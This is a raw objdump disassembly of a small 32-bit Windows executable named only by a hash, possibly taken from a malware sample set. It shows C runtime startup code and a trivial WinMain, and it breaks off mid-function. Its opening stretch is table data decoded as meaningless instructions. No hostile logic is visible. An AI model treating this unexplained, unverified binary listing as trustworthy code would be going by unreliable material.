
3432b52dffcbb380c081d04554bb3d972d7809c7226713cc27ac04e9df27d362.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	inc    eax
  401005:	adc    al,0x40
	...
  40100f:	add    BYTE PTR [eax+0x13],dh
  401012:	inc    eax
  401013:	add    BYTE PTR [eax+0x17],al
  401016:	inc    eax
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax+0x13],dh
  40101e:	add    BYTE PTR [eax],al
  401020:	inc    eax
  401021:	adc    al,0x0
  401023:	add    al,al
  401025:	push   ss
  401026:	add    BYTE PTR [eax],al
  401028:	rcl    BYTE PTR [esi],1
  40102a:	add    BYTE PTR [eax],al
  40102c:	lock push ss
  40102e:	add    BYTE PTR [eax],al
  401030:	inc    eax
  401031:	pop    ss
  401032:	add    BYTE PTR [eax],al
  401034:	and    BYTE PTR [eax],bl
  401036:	add    BYTE PTR [eax],al
  401038:	mov    al,0x1a
  40103a:	add    BYTE PTR [eax],al
  40103c:	loopne 0x401058
  40103e:	add    BYTE PTR [eax],al
  401040:	inc    eax
  401041:	and    BYTE PTR [eax+0x0],al
  401044:	nop
  401045:	and    BYTE PTR [eax+0x0],al
  401048:	inc    eax
  401049:	add    BYTE PTR [ebx+0x0],dh
  40104c:	jns    0x40104e
  40104e:	jae    0x401050
  401050:	add    BYTE PTR fs:[ebp+0x0],ch
  401054:	add    BYTE PTR cs:[ebx+0x0],ah
  401058:	jo     0x40105a
  40105a:	ins    BYTE PTR es:[edi],dx
  40105b:	add    BYTE PTR [eax+eax*1],ch
  40105e:	xor    al,BYTE PTR [eax]
  401060:	xor    BYTE PTR [eax],al
  401062:	add    BYTE PTR ss:[eax],al
	...
  401071:	add    BYTE PTR [eax],al
  401073:	add    BYTE PTR [eax+0x3c],cl
  401076:	lahf   
  401077:	push   ebp
  401078:	add    BYTE PTR [eax],al
  40107a:	add    BYTE PTR [eax],al
  40107c:	add    al,BYTE PTR [eax]
  40107e:	add    BYTE PTR [eax],al
  401080:	xor    eax,0x34000000
  401085:	adc    DWORD PTR [eax],eax
  401087:	add    BYTE PTR [eax*1+0x0],dh
  40108e:	add    BYTE PTR [eax],al
  401090:	dec    eax
  401091:	cmp    al,0x9f
  401093:	push   ebp
  401094:	add    BYTE PTR [eax],al
  401096:	add    BYTE PTR [eax],al
  401098:	or     eax,0xc8000000
  40109d:	add    DWORD PTR [eax],eax
  40109f:	add    BYTE PTR [eax-0x7fffffef],al
  4010a5:	add    eax,0x0
	...
  4010c6:	add    BYTE PTR [eax],al
  4010c8:	push   0x0
	...
  401101:	add    BYTE PTR [eax],al
  401103:	add    BYTE PTR [eax+eiz*1],al
  401106:	inc    eax
  401107:	add    BYTE PTR [eax],dh
  401109:	adc    DWORD PTR [eax+0x0],eax
  40110c:	add    DWORD PTR [eax],eax
  40110e:	add    BYTE PTR [eax],al
  401110:	nop
  401111:	xor    BYTE PTR [eax+0x0],al
  401114:	add    BYTE PTR [eax],al
  401116:	add    BYTE PTR [eax],al
  401118:	sbb    al,0x10
  40111a:	inc    eax
  40111b:	add    BYTE PTR [ecx],cl
  40111d:	add    BYTE PTR [eax],al
  40111f:	add    BYTE PTR [eax],al
  401121:	xor    eax,0x0
	...
  40112e:	add    BYTE PTR [eax],al
  401130:	mov    al,0x1a
  401132:	add    BYTE PTR [eax],al
  401134:	push   edx
  401135:	push   ebx
  401136:	inc    esp
  401137:	push   ebx
  401138:	addr16 fmul st(1),st
  40113b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40113c:	sahf   
  40113d:	mov    esp,0x41884576
  401142:	stc    
  401143:	xchg   esp,eax
  401144:	or     al,0xa0
  401146:	add    eax,0x181
  40114b:	add    BYTE PTR [ebx+0x79],dl
  40114e:	jae    0x4011c4
  401150:	gs ins DWORD PTR es:[edi],dx
  401152:	push   eax
  401153:	jb     0x4011c4
  401155:	jo     0x4011bc
  401157:	jb     0x4011cd
  401159:	imul   esp,DWORD PTR [ebp+0x73],0x64726148
  401160:	ja     0x4011c3
  401162:	jb     0x4011c9
  401164:	cs jo  0x4011cb
  401167:	bound  eax,QWORD PTR [eax]
	...
  40117d:	add    BYTE PTR [eax],al
  40117f:	add    BYTE PTR [edi+0x43],al
  401182:	push   esp
  401183:	dec    esp
  401184:	add    BYTE PTR [eax],dl
  401186:	add    BYTE PTR [eax],al
  401188:	add    al,0x0
  40118a:	add    BYTE PTR [eax],al
  40118c:	cs inc ebx
  40118e:	push   edx
  40118f:	push   esp
  401190:	and    al,0x58
  401192:	inc    ebx
  401193:	inc    ecx
  401194:	add    BYTE PTR [eax],al
  401196:	add    BYTE PTR [eax],al
  401198:	add    al,0x10
  40119a:	add    BYTE PTR [eax],al
  40119c:	add    al,0x0
  40119e:	add    BYTE PTR [eax],al
  4011a0:	cs inc ebx
  4011a2:	push   edx
  4011a3:	push   esp
  4011a4:	and    al,0x58
  4011a6:	inc    ebx
  4011a7:	inc    ecx
  4011a8:	inc    ecx
  4011a9:	add    BYTE PTR [eax],al
  4011ab:	add    BYTE PTR [eax],cl
  4011ad:	adc    BYTE PTR [eax],al
  4011af:	add    BYTE PTR [eax+eax*1],al
  4011b2:	add    BYTE PTR [eax],al
  4011b4:	cs inc ebx
  4011b6:	push   edx
  4011b7:	push   esp
  4011b8:	and    al,0x58
  4011ba:	inc    ebx
  4011bb:	pop    edx
  4011bc:	add    BYTE PTR [eax],al
  4011be:	add    BYTE PTR [eax],al
  4011c0:	or     al,0x10
  4011c2:	add    BYTE PTR [eax],al
  4011c4:	add    al,0x0
  4011c6:	add    BYTE PTR [eax],al
  4011c8:	cs inc ebx
  4011ca:	push   edx
  4011cb:	push   esp
  4011cc:	and    al,0x58
  4011ce:	dec    ecx
  4011cf:	inc    ecx
  4011d0:	add    BYTE PTR [eax],al
  4011d2:	add    BYTE PTR [eax],al
  4011d4:	adc    BYTE PTR [eax],dl
  4011d6:	add    BYTE PTR [eax],al
  4011d8:	add    al,0x0
  4011da:	add    BYTE PTR [eax],al
  4011dc:	cs inc ebx
  4011de:	push   edx
  4011df:	push   esp
  4011e0:	and    al,0x58
  4011e2:	dec    ecx
  4011e3:	inc    ecx
  4011e4:	inc    ecx
  4011e5:	add    BYTE PTR [eax],al
  4011e7:	add    BYTE PTR [eax+edx*1],dl
  4011ea:	add    BYTE PTR [eax],al
  4011ec:	add    al,0x0
  4011ee:	add    BYTE PTR [eax],al
  4011f0:	cs inc ebx
  4011f2:	push   edx
  4011f3:	push   esp
  4011f4:	and    al,0x58
  4011f6:	dec    ecx
  4011f7:	pop    ecx
  4011f8:	add    BYTE PTR [eax],al
  4011fa:	add    BYTE PTR [eax],al
  4011fc:	sbb    BYTE PTR [eax],dl
  4011fe:	add    BYTE PTR [eax],al
  401200:	add    al,0x0
  401202:	add    BYTE PTR [eax],al
  401204:	cs inc ebx
  401206:	push   edx
  401207:	push   esp
  401208:	and    al,0x58
  40120a:	dec    ecx
  40120b:	pop    edx
  40120c:	add    BYTE PTR [eax],al
  40120e:	add    BYTE PTR [eax],al
  401210:	sbb    al,0x10
  401212:	add    BYTE PTR [eax],al
  401214:	and    al,0x0
  401216:	add    BYTE PTR [eax],al
  401218:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  401220:	add    BYTE PTR [eax],al
  401222:	add    BYTE PTR [eax],al
  401224:	inc    eax
  401225:	adc    BYTE PTR [eax],al
  401227:	add    al,dh
  401229:	add    BYTE PTR [eax],al
  40122b:	add    BYTE PTR [esi],ch
  40122d:	jb     0x401293
  40122f:	popa   
  401230:	je     0x401293
  401232:	add    BYTE PTR [eax],al
  401234:	xor    BYTE PTR [ecx],dl
  401236:	add    BYTE PTR [eax],al
  401238:	add    al,0x0
  40123a:	add    BYTE PTR [eax],al
  40123c:	cs jb  0x4012a3
  40123f:	popa   
  401240:	je     0x4012a3
  401242:	and    al,0x73
  401244:	js     0x4012aa
  401246:	popa   
  401247:	je     0x4012aa
  401249:	add    BYTE PTR [eax],al
  40124b:	add    BYTE PTR [ecx+edx*1],dh
  40124e:	add    BYTE PTR [eax],al
  401250:	adc    al,0x2
  401252:	add    BYTE PTR [eax],al
  401254:	cs jb  0x4012bb
  401257:	popa   
  401258:	je     0x4012bb
  40125a:	and    al,0x7a
  40125c:	jp     0x4012d8
  40125e:	bound  esp,QWORD PTR fs:[edi+0x0]
  401262:	add    BYTE PTR [eax],al
  401264:	push   eax
  401265:	adc    eax,DWORD PTR [eax]
  401267:	add    BYTE PTR [eax+0x9],al
  40126a:	add    BYTE PTR [eax],al
  40126c:	cs je  0x4012d4
  40126f:	js     0x4012e5
  401271:	and    al,0x6d
  401273:	outs   dx,BYTE PTR ds:[esi]
  401274:	add    BYTE PTR [eax],al
  401276:	add    BYTE PTR [eax],al
  401278:	nop
  401279:	sbb    al,0x0
  40127b:	add    BYTE PTR [eax+eax*1+0x0],ah
  40127f:	add    BYTE PTR [esi],ch
  401281:	js     0x4012e7
  401283:	popa   
  401284:	je     0x4012e7
  401286:	and    al,0x78
  401288:	add    BYTE PTR [eax],al
  40128a:	add    BYTE PTR [eax],al
  40128c:	add    BYTE PTR [eax],ah
  40128e:	add    BYTE PTR [eax],al
  401290:	or     al,0x0
  401292:	add    BYTE PTR [eax],al
  401294:	cs fs popa 
  401297:	je     0x4012fa
  401299:	add    BYTE PTR [eax],al
  40129b:	add    BYTE PTR [eax],dl
  40129d:	and    BYTE PTR [eax],al
  40129f:	add    BYTE PTR [eax+0x3],ah
  4012a2:	add    BYTE PTR [eax],al
  4012a4:	bound  esi,QWORD PTR cs:[ebx+0x73]
  4012a8:	add    BYTE PTR [eax],al
  4012aa:	add    BYTE PTR [eax],al
  4012ac:	add    BYTE PTR [eax],dh
  4012ae:	add    BYTE PTR [eax],al
  4012b0:	nop
  4012b1:	add    BYTE PTR [eax],al
  4012b3:	add    BYTE PTR [esi],ch
  4012b5:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  4012bd:	add    BYTE PTR [eax],al
  4012bf:	add    BYTE PTR [eax+0x4000030],dl
  4012c5:	add    BYTE PTR [eax],al
  4012c7:	add    BYTE PTR [esi],ch
  4012c9:	xor    BYTE PTR [eax],dh
  4012cb:	arpl   WORD PTR [esi+0x67],sp
  4012ce:	add    BYTE PTR [eax],al
  4012d0:	xchg   esp,eax
  4012d1:	xor    BYTE PTR [eax],al
  4012d3:	add    BYTE PTR [eax+0x2e000000],ah
  4012d9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x322461
  4012e1:	add    BYTE PTR [eax],al
  4012e3:	add    BYTE PTR [ecx+esi*1],dh
  4012e6:	add    BYTE PTR [eax],al
  4012e8:	adc    al,0x0
  4012ea:	add    BYTE PTR [eax],al
  4012ec:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  4012f5:	add    BYTE PTR [eax],al
  4012f7:	add    BYTE PTR [eax+0x31],cl
  4012fa:	add    BYTE PTR [eax],al
  4012fc:	nop
  4012fd:	add    BYTE PTR [eax],al
  4012ff:	add    BYTE PTR [esi],ch
  401301:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  401309:	add    BYTE PTR [eax],al
  40130b:	add    al,bl
  40130d:	xor    DWORD PTR [eax],eax
  40130f:	add    dh,ch
  401311:	add    al,BYTE PTR [eax]
  401313:	add    BYTE PTR [esi],ch
  401315:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  40131d:	add    BYTE PTR [eax],al
  40131f:	add    BYTE PTR [eax],al
  401321:	inc    eax
  401322:	add    BYTE PTR [eax],al
  401324:	xor    BYTE PTR [ebx],al
  401326:	add    BYTE PTR [eax],al
  401328:	cs jb  0x40139e
  40132b:	jb     0x401390
  40132d:	and    al,0x30
  40132f:	xor    DWORD PTR [eax],eax
  401331:	add    BYTE PTR [eax],al
  401333:	add    BYTE PTR [eax],dh
  401335:	inc    ebx
  401336:	add    BYTE PTR [eax],al
  401338:	loopne 0x40135d
  40133a:	add    DWORD PTR [eax],eax
  40133c:	cs jb  0x4013b2
  40133f:	jb     0x4013a4
  401341:	and    al,0x30
  401343:	xor    al,BYTE PTR [eax]
	...
  401355:	push   0x401048
  40135a:	call   DWORD PTR ds:0x403000
  401360:	xor    eax,eax
  401362:	ret    0x10
  401365:	int3   
  401366:	int3   
  401367:	int3   
  401368:	int3   
  401369:	int3   
  40136a:	int3   
  40136b:	int3   
  40136c:	int3   
  40136d:	int3   
  40136e:	int3   
  40136f:	int3   
  401370:	mov    eax,0x5a4d
  401375:	cmp    WORD PTR ds:0x400000,ax
  40137c:	je     0x401382
  40137e:	xor    eax,eax
  401380:	jmp    0x4013d0
  401382:	mov    ecx,DWORD PTR ds:0x40003c
  401388:	cmp    DWORD PTR [ecx+0x400000],0x4550
  401392:	jne    0x40137e
  401394:	movzx  eax,WORD PTR [ecx+0x400018]
  40139b:	cmp    eax,0x10b
  4013a0:	je     0x4013bc
  4013a2:	cmp    eax,0x20b
  4013a7:	jne    0x40137e
  4013a9:	xor    eax,eax
  4013ab:	cmp    DWORD PTR [ecx+0x400084],0xe
  4013b2:	jbe    0x4013d0
  4013b4:	cmp    DWORD PTR [ecx+0x4000f8],eax
  4013ba:	jmp    0x4013cd
  4013bc:	xor    eax,eax
  4013be:	cmp    DWORD PTR [ecx+0x400074],0xe
  4013c5:	jbe    0x4013d0
  4013c7:	cmp    DWORD PTR [ecx+0x4000e8],eax
  4013cd:	setne  al
  4013d0:	push   0x2
  4013d2:	mov    ds:0x402028,eax
  4013d7:	call   0x4017ce
  4013dc:	push   eax
  4013dd:	call   DWORD PTR ds:0x403078
  4013e3:	or     DWORD PTR ds:0x40235c,0xffffffff
  4013ea:	or     DWORD PTR ds:0x402360,0xffffffff
  4013f1:	pop    ecx
  4013f2:	pop    ecx
  4013f3:	call   DWORD PTR ds:0x403068
  4013f9:	mov    ecx,DWORD PTR ds:0x40203c
  4013ff:	mov    DWORD PTR [eax],ecx
  401401:	call   DWORD PTR ds:0x403084
  401407:	mov    ecx,DWORD PTR ds:0x402030
  40140d:	mov    DWORD PTR [eax],ecx
  40140f:	call   0x401820
  401414:	cmp    DWORD PTR ds:0x402000,0x0
  40141b:	jne    0x401429
  40141d:	push   0x401820
  401422:	call   DWORD PTR ds:0x403064
  401428:	pop    ecx
  401429:	call   0x401a2f
  40142e:	xor    eax,eax
  401430:	ret    
  401431:	int3   
  401432:	int3   
  401433:	int3   
  401434:	int3   
  401435:	int3   
  401436:	int3   
  401437:	int3   
  401438:	int3   
  401439:	int3   
  40143a:	int3   
  40143b:	int3   
  40143c:	int3   
  40143d:	int3   
  40143e:	int3   
  40143f:	int3   
  401440:	mov    eax,ds:0x402038
  401445:	push   0x40202c
  40144a:	push   DWORD PTR ds:0x402034
  401450:	mov    ds:0x40202c,eax
  401455:	push   0x402020
  40145a:	push   0x40201c
  40145f:	push   0x402018
  401464:	call   DWORD PTR ds:0x40307c
  40146a:	add    esp,0x14
  40146d:	mov    ds:0x402024,eax
  401472:	ret    
  401473:	int3   
  401474:	int3   
  401475:	int3   
  401476:	int3   
  401477:	int3   
  401478:	push   0x5c
  40147a:	push   0x401c90
  40147f:	call   0x401a54
  401484:	and    DWORD PTR [ebp-0x24],0x0
  401488:	and    DWORD PTR [ebp-0x4],0x0
  40148c:	lea    eax,[ebp-0x6c]
  40148f:	push   eax
  401490:	call   DWORD PTR ds:0x40301c
  401496:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40149d:	xor    ebx,ebx
  40149f:	inc    ebx
  4014a0:	mov    DWORD PTR [ebp-0x4],ebx
  4014a3:	mov    eax,fs:0x18
  4014a9:	mov    edi,DWORD PTR [eax+0x4]
  4014ac:	xor    esi,esi
  4014ae:	mov    edx,0x402364
  4014b3:	mov    ecx,edi
  4014b5:	xor    eax,eax
  4014b7:	lock cmpxchg DWORD PTR [edx],ecx
  4014bb:	test   eax,eax
  4014bd:	je     0x4014c5
  4014bf:	cmp    eax,edi
  4014c1:	jne    0x4014d7
  4014c3:	mov    esi,ebx
  4014c5:	cmp    DWORD PTR ds:0x402368,ebx
  4014cb:	jne    0x4014e4
  4014cd:	push   0x1f
  4014cf:	call   0x40180a
  4014d4:	pop    ecx
  4014d5:	jmp    0x401513
  4014d7:	push   0x3e8
  4014dc:	call   DWORD PTR ds:0x40303c
  4014e2:	jmp    0x4014ae
  4014e4:	cmp    DWORD PTR ds:0x402368,0x0
  4014eb:	jne    0x40150d
  4014ed:	mov    DWORD PTR ds:0x402368,ebx
  4014f3:	push   0x401018
  4014f8:	push   0x40100c
  4014fd:	call   0x401664
  401502:	pop    ecx
  401503:	pop    ecx
  401504:	test   eax,eax
  401506:	je     0x401513
  401508:	jmp    0x40164d
  40150d:	mov    DWORD PTR ds:0x402014,ebx
  401513:	cmp    DWORD PTR ds:0x402368,ebx
  401519:	jne    0x401536
  40151b:	push   0x401008
  401520:	push   0x401000
  401525:	call   0x401a48
  40152a:	pop    ecx
  40152b:	pop    ecx
  40152c:	mov    DWORD PTR ds:0x402368,0x2
  401536:	test   esi,esi
  401538:	jne    0x401543
  40153a:	xor    eax,eax
  40153c:	mov    ecx,0x402364
  401541:	xchg   DWORD PTR [ecx],eax
  401543:	cmp    DWORD PTR ds:0x40236c,0x0
  40154a:	je     0x401571
  40154c:	push   0x40236c
  401551:	call   0x401880
  401556:	pop    ecx
  401557:	test   eax,eax
  401559:	je     0x401571
  40155b:	push   0x0
  40155d:	push   0x2
  40155f:	push   0x0
  401561:	mov    esi,DWORD PTR ds:0x40236c
  401567:	mov    ecx,esi
  401569:	call   DWORD PTR ds:0x403090
  40156f:	call   esi
  401571:	mov    eax,ds:0x40305c
  401576:	mov    ecx,DWORD PTR [eax]
  401578:	test   ecx,ecx
  40157a:	je     0x40164d
  401580:	mov    DWORD PTR [ebp-0x20],ecx
  401583:	push   0x20
  401585:	pop    esi
  401586:	mov    edx,DWORD PTR [ebp-0x24]
  401589:	movzx  eax,WORD PTR [ecx]
  40158c:	cmp    ax,si
  40158f:	ja     0x4015e1
  401591:	test   ax,ax
  401594:	je     0x40159a
  401596:	test   edx,edx
  401598:	jne    0x4015e1
  40159a:	movzx  eax,WORD PTR [ecx]
  40159d:	test   ax,ax
  4015a0:	je     0x4015af
  4015a2:	cmp    ax,si
  4015a5:	ja     0x4015af
  4015a7:	add    ecx,0x2
  4015aa:	mov    DWORD PTR [ebp-0x20],ecx
  4015ad:	jmp    0x40159a
  4015af:	test   BYTE PTR [ebp-0x40],0x1
  4015b3:	je     0x4015bb
  4015b5:	movzx  eax,WORD PTR [ebp-0x3c]
  4015b9:	jmp    0x4015be
  4015bb:	push   0xa
  4015bd:	pop    eax
  4015be:	push   eax
  4015bf:	push   ecx
  4015c0:	push   0x0
  4015c2:	push   0x400000
  4015c7:	call   0x401355
  4015cc:	mov    ds:0x402010,eax
  4015d1:	cmp    DWORD PTR ds:0x402028,0x0
  4015d8:	jne    0x401629
  4015da:	push   eax
  4015db:	call   DWORD PTR ds:0x403074
  4015e1:	cmp    eax,0x22
  4015e4:	jne    0x4015f2
  4015e6:	xor    eax,eax
  4015e8:	test   edx,edx
  4015ea:	sete   al
  4015ed:	mov    edx,eax
  4015ef:	mov    DWORD PTR [ebp-0x24],edx
  4015f2:	add    ecx,0x2
  4015f5:	mov    DWORD PTR [ebp-0x20],ecx
  4015f8:	jmp    0x401589
  4015fa:	mov    ecx,DWORD PTR [ebp-0x14]
  4015fd:	mov    eax,DWORD PTR [ecx]
  4015ff:	mov    eax,DWORD PTR [eax]
  401601:	mov    DWORD PTR [ebp-0x28],eax
  401604:	push   ecx
  401605:	push   eax
  401606:	call   0x401754
  40160b:	pop    ecx
  40160c:	pop    ecx
  40160d:	ret    
  40160e:	mov    esp,DWORD PTR [ebp-0x18]
  401611:	mov    eax,DWORD PTR [ebp-0x28]
  401614:	mov    ds:0x402010,eax
  401619:	cmp    DWORD PTR ds:0x402028,0x0
  401620:	jne    0x401629
  401622:	push   eax
  401623:	call   DWORD PTR ds:0x403070
  401629:	cmp    DWORD PTR ds:0x402014,0x0
  401630:	jne    0x40163d
  401632:	call   DWORD PTR ds:0x40306c
  401638:	mov    eax,ds:0x402010
  40163d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401644:	jmp    0x401659
  401646:	xor    eax,eax
  401648:	inc    eax
  401649:	ret    
  40164a:	mov    esp,DWORD PTR [ebp-0x18]
  40164d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401654:	mov    eax,0xff
  401659:	call   0x401a9c
  40165e:	ret    
  40165f:	int3   
  401660:	int3   
  401661:	int3   
  401662:	int3   
  401663:	int3   
  401664:	mov    edi,edi
  401666:	push   ebp
  401667:	mov    ebp,esp
  401669:	push   ecx
  40166a:	mov    eax,ds:0x402004
  40166f:	xor    eax,ebp
  401671:	mov    DWORD PTR [ebp-0x4],eax
  401674:	push   esi
  401675:	mov    esi,DWORD PTR [ebp+0x8]
  401678:	xor    eax,eax
  40167a:	cmp    esi,DWORD PTR [ebp+0xc]
  40167d:	jae    0x40169d
  40167f:	push   edi
  401680:	test   eax,eax
  401682:	jne    0x40169c
  401684:	mov    edi,DWORD PTR [esi]
  401686:	test   edi,edi
  401688:	je     0x401694
  40168a:	mov    ecx,edi
  40168c:	call   DWORD PTR ds:0x403090
  401692:	call   edi
  401694:	add    esi,0x4
  401697:	cmp    esi,DWORD PTR [ebp+0xc]
  40169a:	jb     0x401680
  40169c:	pop    edi
  40169d:	mov    ecx,DWORD PTR [ebp-0x4]
  4016a0:	xor    ecx,ebp
  4016a2:	pop    esi
  4016a3:	call   0x4016d0
  4016a8:	mov    esp,ebp
  4016aa:	pop    ebp
  4016ab:	ret    
  4016ac:	int3   
  4016ad:	int3   
  4016ae:	int3   
  4016af:	int3   
  4016b0:	int3   
  4016b1:	int3   
  4016b2:	int3   
  4016b3:	int3   
  4016b4:	int3   
  4016b5:	int3   
  4016b6:	int3   
  4016b7:	int3   
  4016b8:	int3   
  4016b9:	int3   
  4016ba:	int3   
  4016bb:	int3   
  4016bc:	int3   
  4016bd:	int3   
  4016be:	int3   
  4016bf:	int3   
  4016c0:	call   0x401988
  4016c5:	jmp    0x401478
  4016ca:	int3   
  4016cb:	int3   
  4016cc:	int3   
  4016cd:	int3   
  4016ce:	int3   
  4016cf:	int3   
  4016d0:	cmp    ecx,DWORD PTR ds:0x402004
  4016d6:	jne    0x4016db
  4016d8:	ret    0x0
  4016db:	jmp    0x401b15
  4016e0:	int3   
  4016e1:	int3   
  4016e2:	int3   
  4016e3:	int3   
  4016e4:	int3   
  4016e5:	int3   
  4016e6:	int3   
  4016e7:	int3   
  4016e8:	int3   
  4016e9:	int3   
  4016ea:	int3   
  4016eb:	int3   
  4016ec:	int3   
  4016ed:	int3   
  4016ee:	int3   
  4016ef:	int3   
  4016f0:	mov    edi,edi
  4016f2:	push   ebp
  4016f3:	mov    ebp,esp
  4016f5:	mov    eax,DWORD PTR [ebp+0x8]
  4016f8:	mov    eax,DWORD PTR [eax]
  4016fa:	cmp    DWORD PTR [eax],0xe06d7363
  401700:	jne    0x40172d
  401702:	cmp    DWORD PTR [eax+0x10],0x3
  401706:	jne    0x40172d
  401708:	mov    eax,DWORD PTR [eax+0x14]
  40170b:	cmp    eax,0x19930520
  401710:	je     0x401727
  401712:	cmp    eax,0x19930521
  401717:	je     0x401727
  401719:	cmp    eax,0x19930522
  40171e:	je     0x401727
  401720:	cmp    eax,0x1994000
  401725:	jne    0x40172d
  401727:	call   DWORD PTR ds:0x403058
  40172d:	xor    eax,eax
  40172f:	pop    ebp
  401730:	ret    0x4
  401733:	int3   
  401734:	int3   
  401735:	int3   
  401736:	int3   
  401737:	int3   
  401738:	int3   
  401739:	int3   
  40173a:	int3   
  40173b:	int3   
  40173c:	int3   
  40173d:	int3   
  40173e:	int3   
  40173f:	int3   
  401740:	push   0x4016f0
  401745:	call   DWORD PTR ds:0x40300c
  40174b:	xor    eax,eax
  40174d:	ret    
  40174e:	int3   
  40174f:	int3   
  401750:	int3   
  401751:	int3   
  401752:	int3   
  401753:	int3   
  401754:	jmp    DWORD PTR ds:0x403088
  40175a:	int3   
  40175b:	int3   
  40175c:	int3   
  40175d:	int3   
  40175e:	int3   
  40175f:	push   0xc
  401761:	push   0x401cb8
  401766:	call   0x401c2c
  40176b:	xor    ecx,ecx
  40176d:	mov    eax,DWORD PTR [ebp+0x8]
  401770:	test   eax,eax
  401772:	je     0x4017bf
  401774:	cmp    eax,0xffffffff
  401777:	je     0x4017bf
  401779:	mov    DWORD PTR [ebp-0x4],ecx
  40177c:	mov    edx,0x5a4d
  401781:	cmp    WORD PTR [eax],dx
  401784:	jne    0x4017b8
  401786:	mov    edx,DWORD PTR [eax+0x3c]
  401789:	test   edx,edx
  40178b:	js     0x4017b8
  40178d:	cmp    edx,0x10000000
  401793:	jae    0x4017b8
  401795:	add    eax,edx
  401797:	mov    DWORD PTR [ebp-0x1c],eax
  40179a:	mov    ecx,DWORD PTR [eax]
  40179c:	sub    ecx,0x4550
  4017a2:	neg    ecx
  4017a4:	sbb    ecx,ecx
  4017a6:	not    ecx
  4017a8:	and    ecx,eax
  4017aa:	jmp    0x4017b5
  4017ac:	xor    eax,eax
  4017ae:	inc    eax
  4017af:	ret    
  4017b0:	mov    esp,DWORD PTR [ebp-0x18]
  4017b3:	xor    ecx,ecx
  4017b5:	mov    DWORD PTR [ebp-0x1c],ecx
  4017b8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4017bf:	mov    eax,ecx
  4017c1:	call   0x401c71
  4017c6:	ret    0x4
  4017c9:	int3   
  4017ca:	int3   
  4017cb:	int3   
  4017cc:	int3   
  4017cd:	int3   
  4017ce:	mov    edi,edi
  4017d0:	push   ebp
  4017d1:	mov    ebp,esp
  4017d3:	push   0x0
  4017d5:	call   DWORD PTR ds:0x403014
  4017db:	test   eax,eax
  4017dd:	je     0x4017ff
  4017df:	push   eax
  4017e0:	call   0x40175f
  4017e5:	test   eax,eax
  4017e7:	je     0x4017ff
  4017e9:	movzx  ecx,WORD PTR [eax+0x5c]
  4017ed:	push   0x2
  4017ef:	pop    eax
  4017f0:	cmp    cx,ax
  4017f3:	je     0x401802
  4017f5:	cmp    ecx,0x3
  4017f8:	jne    0x4017ff
  4017fa:	xor    eax,eax
  4017fc:	inc    eax
  4017fd:	pop    ebp
  4017fe:	ret    
  4017ff:	mov    eax,DWORD PTR [ebp+0x8]
  401802:	pop    ebp
  401803:	ret    
  401804:	int3   
  401805:	int3   
  401806:	int3   
  401807:	int3   
  401808:	int3   
  401809:	int3   
  40180a:	jmp    DWORD PTR ds:0x403080
  401810:	int3   
  401811:	int3   
  401812:	int3   
  401813:	int3   
  401814:	int3   
  401815:	int3   
  401816:	int3   
  401817:	int3   
  401818:	int3   
  401819:	int3   
  40181a:	int3   
  40181b:	int3   
  40181c:	int3   
  40181d:	int3   
  40181e:	int3   
  40181f:	int3   
  401820:	xor    eax,eax
  401822:	ret    
  401823:	int3   
  401824:	int3   
  401825:	int3   
  401826:	int3   
  401827:	int3   
  401828:	int3   
  401829:	int3   
  40182a:	int3   
  40182b:	int3   
  40182c:	int3   
  40182d:	int3   
  40182e:	int3   
  40182f:	int3   
  401830:	mov    edi,edi
  401832:	push   ebp
  401833:	mov    ebp,esp
  401835:	mov    eax,DWORD PTR [ebp+0x8]
  401838:	xor    edx,edx
  40183a:	push   ebx
  40183b:	push   esi
  40183c:	push   edi
  40183d:	mov    ecx,DWORD PTR [eax+0x3c]
  401840:	add    ecx,eax
  401842:	movzx  eax,WORD PTR [ecx+0x14]
  401846:	movzx  ebx,WORD PTR [ecx+0x6]
  40184a:	add    eax,0x18
  40184d:	add    eax,ecx
  40184f:	test   ebx,ebx
  401851:	je     0x40186e
  401853:	mov    edi,DWORD PTR [ebp+0xc]
  401856:	mov    esi,DWORD PTR [eax+0xc]
  401859:	cmp    edi,esi
  40185b:	jb     0x401866
  40185d:	mov    ecx,DWORD PTR [eax+0x8]
  401860:	add    ecx,esi
  401862:	cmp    edi,ecx
  401864:	jb     0x401870
  401866:	inc    edx
  401867:	add    eax,0x28
  40186a:	cmp    edx,ebx
  40186c:	jb     0x401856
  40186e:	xor    eax,eax
  401870:	pop    edi
  401871:	pop    esi
  401872:	pop    ebx
  401873:	pop    ebp
  401874:	ret    
  401875:	int3   
  401876:	int3   
  401877:	int3   
  401878:	int3   
  401879:	int3   
  40187a:	int3   
  40187b:	int3   
  40187c:	int3   
  40187d:	int3   
  40187e:	int3   
  40187f:	int3   
  401880:	mov    edi,edi
  401882:	push   ebp
  401883:	mov    ebp,esp
  401885:	push   0xfffffffe
  401887:	push   0x401cd8
  40188c:	push   0x401ab0
  401891:	mov    eax,fs:0x0
  401897:	push   eax
  401898:	sub    esp,0x8
  40189b:	push   ebx
  40189c:	push   esi
  40189d:	push   edi
  40189e:	mov    eax,ds:0x402004
  4018a3:	xor    DWORD PTR [ebp-0x8],eax
  4018a6:	xor    eax,ebp
  4018a8:	push   eax
  4018a9:	lea    eax,[ebp-0x10]
  4018ac:	mov    fs:0x0,eax
  4018b2:	mov    DWORD PTR [ebp-0x18],esp
  4018b5:	mov    DWORD PTR [ebp-0x4],0x0
  4018bc:	push   0x400000
  4018c1:	call   0x401950
  4018c6:	add    esp,0x4
  4018c9:	test   eax,eax
  4018cb:	je     0x401921
  4018cd:	mov    eax,DWORD PTR [ebp+0x8]
  4018d0:	sub    eax,0x400000
  4018d5:	push   eax
  4018d6:	push   0x400000
  4018db:	call   0x401830
  4018e0:	add    esp,0x8
